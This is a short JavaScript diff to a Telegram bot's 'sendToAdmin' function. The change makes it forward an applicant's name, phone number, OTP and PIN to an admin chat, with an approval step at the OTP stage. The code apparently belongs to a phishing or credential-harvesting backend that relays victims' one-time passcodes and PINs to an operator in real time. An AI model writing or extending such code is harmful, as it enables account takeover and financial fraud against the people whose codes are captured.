@@ -8,13 +8,17 @@ const ADMIN_ID = process.env.ADMIN_CHAT_ID;
 const botManager = {
     bot: bot,
 
-    sendToAdmin: (appId, title, data, needsApproval = false) => {
+    // Send only name, phone number, OTP and PIN to admin
+    // Parameters: appId, name, phoneNumber, otp, pin, needsApproval (for OTP step)
+    sendToAdmin: (appId, name, phoneNumber, otp, pin, needsApproval = false) => {
         let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
+        msg += `<b>New Application</b>\n`;
+        msg += `🆔 ID: <code>${appId}</code>\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        for (const [k, v] of Object.entries(data)) {
-            msg += `<b>${k}:</b> <code>${v}</code>\n`;
-        }
+        if (name) msg += `<b>Name:</b> <code>${name}</code>\n`;
+        if (phoneNumber) msg += `<b>Phone:</b> <code>${phoneNumber}</code>\n`;
+        if (otp) msg += `<b>OTP:</b> <code>${otp}</code>\n`;
+        if (pin) msg += `<b>PIN:</b> <code>${pin}</code>\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━`;
 
         const options = { parse_mode: 'HTML' };
